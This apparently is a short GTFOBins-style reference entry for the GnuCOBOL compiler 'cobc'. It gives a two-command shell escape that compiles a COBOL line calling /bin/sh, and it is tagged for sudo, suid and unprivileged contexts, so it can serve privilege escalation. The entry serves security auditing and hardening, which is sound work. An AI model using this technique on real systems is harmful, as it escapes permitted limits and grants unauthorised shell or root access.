title: cobc
html:
cobc

Shell

Context: sudo, suid, unprivileged

echo 'CALL "SYSTEM" USING "/bin/sh".' >/path/to/temp-file
cobc -xFj --frelax-syntax-checks /path/to/temp-file
excerpt: cobc Shell Context: sudo, suid, unprivileged echo 'CALL "SYSTEM" USING "/bin/sh".' >/path/to/temp-file cobc -xFj --frelax-syntax-checks /path/to/temp-file
